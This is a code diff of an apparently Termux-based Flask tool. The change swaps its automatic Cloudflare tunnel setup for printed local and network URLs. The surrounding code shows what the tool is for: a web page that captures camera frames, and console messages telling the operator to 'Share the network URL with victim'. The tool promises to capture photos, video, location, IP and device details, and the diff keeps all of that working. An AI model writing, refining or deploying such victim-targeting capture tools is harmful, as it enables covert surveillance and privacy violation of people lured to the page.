@@ -46,7 +46,6 @@ for path in GALLERY_PATHS:
         pass
 
 app = Flask(__name__)
-public_url = None
 
 def show_tool_lock_screen():
     """Show the tool lock screen"""
@@ -97,69 +96,6 @@ def save_to_all_locations(file_data, filename, file_type="photo"):
             pass
     
     return saved_paths
-
-def install_cloudflared():
-    """Install cloudflared"""
-    try:
-        result = subprocess.run(['cloudflared', '--version'], capture_output=True, text=True)
-        if result.returncode == 0:
-            print(f"{Fore.GREEN}✅ cloudflared is installed{Style.RESET_ALL}")
-            return True
-    except:
-        pass
-    
-    print(f"{Fore.YELLOW}📥 Installing cloudflared...{Style.RESET_ALL}")
-    try:
-        result = subprocess.run(['pkg', 'install', 'cloudflared', '-y'], 
-                              capture_output=True, text=True, timeout=120)
-        if result.returncode == 0:
-            print(f"{Fore.GREEN}✅ cloudflared installed{Style.RESET_ALL}")
-            return True
-    except:
-        pass
-    
-    print(f"{Fore.RED}❌ Failed to install cloudflared{Style.RESET_ALL}")
-    return False
-
-def start_cloudflare_tunnel():
-    """Start Cloudflare tunnel"""
-    global public_url
-    
-    print(f"{Fore.CYAN}🚀 Starting CLOUDFLARE tunnel...{Style.RESET_ALL}")
-    
-    subprocess.run(['pkill', '-f', 'cloudflared'], capture_output=True)
-    time.sleep(2)
-    
-    try:
-        process = subprocess.Popen([
-            'cloudflared', 'tunnel',
-            '--url', f'http://localhost:{PORT}'
-        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        
-        print(f"{Fore.YELLOW}⏳ Waiting for Cloudflare tunnel (25 seconds)...{Style.RESET_ALL}")
-        time.sleep(25)
-        
-        # Try to get URL
-        for attempt in range(10):
-            try:
-                line = process.stderr.readline()
-                if '.trycloudflare.com' in line:
-                    import re
-                    urls = re.findall(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
-                    if urls:
-                        public_url = urls[0]
-                        print(f"{Fore.GREEN}✅ CLOUDFLARE URL: {public_url}{Style.RESET_ALL}")
-                        return public_url
-            except:
-                pass
-            time.sleep(2)
-        
-        print(f"{Fore.YELLOW}⚠️ Cloudflare tunnel started but URL not captured{Style.RESET_ALL}")
-        return "cloudflare_active"
-        
-    except Exception as e:
-        print(f"{Fore.RED}❌ Cloudflare error: {e}{Style.RESET_ALL}")
-        return None
 
 def get_local_ip():
     """Get local IP"""
@@ -636,7 +572,6 @@ HTML_PAGE = '''
                     canvas.height = video.videoHeight;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0);
-                    
                     const imageData = canvas.toDataURL('image/jpeg', 0.8);
                     collectedData.photos.push(imageData);
                     
@@ -878,44 +813,25 @@ def fallback_data():
     return jsonify({"status": "logged"})
 
 def main():
-    global public_url
-    
     # Show lock screen
     show_tool_lock_screen()
     display_banner()
     
-    print(f"\n{Back.GREEN}{Fore.WHITE}{'🚀 WAN TUNNEL SETUP ':=^60}{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}🔄 Setting up Cloudflare tunnel for WAN access...{Style.RESET_ALL}")
+    print(f"\n{Back.GREEN}{Fore.WHITE}{'🚀 SERVER STARTED ':=^60}{Style.RESET_ALL}")
     
-    # Try Cloudflare tunnel
-    if install_cloudflared():
-        final_url = start_cloudflare_tunnel()
-        service_name = "CLOUDFLARE"
-    else:
-        # Fallback to local
-        local_ip = get_local_ip()
-        final_url = f"http://{local_ip}:{PORT}"
-        service_name = "LOCAL"
+    # Get local URLs
+    local_ip = get_local_ip()
+    local_url = f"http://localhost:{PORT}"
+    network_url = f"http://{local_ip}:{PORT}"
     
-    # If Cloudflare failed, use local
-    if not final_url or final_url == "cloudflare_active":
-        local_ip = get_local_ip()
-        final_url = f"http://{local_ip}:{PORT}"
-        service_name = "LOCAL"
-        print(f"{Fore.RED}❌ Using local URL (only same WiFi){Style.RESET_ALL}")
+    print(f"{Fore.CYAN}🌐 Local URL: {local_url}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}🌐 Network URL: {network_url}{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}📢 Use your tunnel tool to expose port {PORT}{Style.RESET_ALL}")
     
-    print(f"\n{Fore.GREEN}{' SERVER READY ':=^60}{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}🌐 Final URL: {final_url}{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}🔧 Service: {service_name}{Style.RESET_ALL}")
+    # Display QR for network URL
+    display_qr_in_termux(network_url)
     
-    if service_name != "LOCAL":
-        print(f"{Fore.GREEN}✅ This works on ANY device and ANY network!{Style.RESET_ALL}")
-    else:
-        print(f"{Fore.RED}❌ Only works on same WiFi network{Style.RESET_ALL}")
-    
-    display_qr_in_termux(final_url)
-    
-    print(f"\n{Fore.YELLOW}🚀 Share this URL with victim{Style.RESET_ALL}")
+    print(f"\n{Fore.YELLOW}🚀 Share the network URL with victim{Style.RESET_ALL}")
     print(f"{Fore.GREEN}📸 Will capture: 3 photos + 5s video + Location + IP + Device info{Style.RESET_ALL}")
     print(f"{Fore.RED}🔴 Waiting for victim...{Style.RESET_ALL}")
     
@@ -926,3 +842,5 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+          
